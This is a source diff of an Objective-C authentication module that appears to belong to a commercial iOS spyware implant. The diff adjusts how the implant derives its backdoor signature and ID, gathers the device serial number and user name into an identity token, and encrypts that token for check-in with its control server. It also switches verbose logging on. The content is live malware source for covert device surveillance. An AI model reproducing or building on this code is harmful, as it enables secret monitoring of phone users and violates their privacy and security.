@@ -15,13 +15,14 @@
 #import "RCSICommon.h"
 #import "RCSITaskManager.h"
 
+#define JSON_CONF
 ////#import "RCSMLogger.h"
 ////#import "RCSMDebug.h"
 
 //#define DEBUG_AUTH_NOP
-//#define infoLog NSLog
-//#define errorLog NSLog
-//#define warnLog NSLog
+#define infoLog NSLog
+#define errorLog NSLog
+#define warnLog NSLog
 
 @implementation AuthNetworkOperation
 
@@ -29,12 +30,19 @@
 {
   if ((self = [super init]))
     {
-      // Temp Code
-      unsigned char signature[CC_MD5_DIGEST_LENGTH];
-      CC_MD5(gBackdoorSignature, strlen(gBackdoorSignature), signature);
-      
-      mBackdoorSignature = [[NSData alloc] initWithBytes: &signature
-                                                  length: CC_MD5_DIGEST_LENGTH];
+#ifdef JSON_CONF
+    mBackdoorSignature = [[NSData alloc] initWithBytes: gBackdoorSignature
+                                                length: CC_MD5_DIGEST_LENGTH];
+#else
+    // Temp Code
+    unsigned char signature[CC_MD5_DIGEST_LENGTH];
+    CC_MD5(gBackdoorSignature, strlen(gBackdoorSignature), signature);
+    
+    // per 7.6 si usa l'hash??
+    mBackdoorSignature = [[NSData alloc] initWithBytes: &signature
+                                                length: CC_MD5_DIGEST_LENGTH];
+#endif
+
       mTransport = aTransport;
       
 #ifdef DEBUG_AUTH_NOP
@@ -55,11 +63,7 @@
 }
 
 - (BOOL)perform
-{
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"");
-#endif
-  
+{ 
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   u_int randomNumber, i;
@@ -103,13 +107,10 @@
   NSData *confKey = [NSData dataWithBytes: &gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
   
-  NSString *serialNumber;
-  serialNumber = getSystemSerialNumber();
+  NSString *serialNumber = getSystemSerialNumber();
   
   NSMutableString *_instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
-  
-  //CFRelease(serialNumber);
-  
+   
   NSString *userName = NSUserName();
   [_instanceID appendString: userName];
   
@@ -118,15 +119,24 @@
 #endif
   
   NSMutableData *backdoorID = [[NSMutableData alloc] init];
+  
   [backdoorID appendBytes: &gBackdoorID
                    length: strlen(gBackdoorID)];
+                   
+  char *_backdoorIDbuff = (char*)[backdoorID bytes];
+#ifdef JSON_CONF
+  _backdoorIDbuff[strlen(gBackdoorID)-1] = _backdoorIDbuff[strlen(gBackdoorID)-2] = 0;  
+#else
+  // per 7.6 funziona in append????
   [backdoorID appendBytes: &nullTerminator
                    length: sizeof(char)];
   [backdoorID appendBytes: &nullTerminator
                    length: sizeof(char)];
-  
+#endif
+
   NSMutableData *type = [[NSMutableData alloc] initWithData:
                          [@"IPHONE" dataUsingEncoding: NSASCIIStringEncoding]];
+                         
   for (i = 0; i < 10; i++)
     {
       [type appendBytes: &nullTerminator
@@ -141,7 +151,7 @@
   [idToken appendData: instanceID];
   [idToken appendData: type];
   [idToken appendData: confKey];
-  
+
 #ifdef DEBUG_AUTH_NOP
   infoLog(@"kd    : %@", kd);
   infoLog(@"nOnce : %@", nOnce);
@@ -151,6 +161,7 @@
   infoLog(@"confkey     : %@", confKey);
   infoLog(@"idToken: %@", idToken);
 #endif
+
   NSData *shaIDToken = [idToken sha1Hash];
   
 #ifdef DEBUG_AUTH_NOP
@@ -172,6 +183,8 @@
   
   NSMutableData *encMessage = [[NSMutableData alloc] initWithData: message];
   [encMessage encryptWithKey: mBackdoorSignature];
+  //NSMutableData *tmpencMessage = [[NSMutableData alloc] initWithData: message];
+  //NSMutableData *encMessage = [tmpencMessage encryptPKCS7: mBackdoorSignature];
   
 #ifdef DEBUG_AUTH_NOP
   infoLog(@"message enc: %@", encMessage);
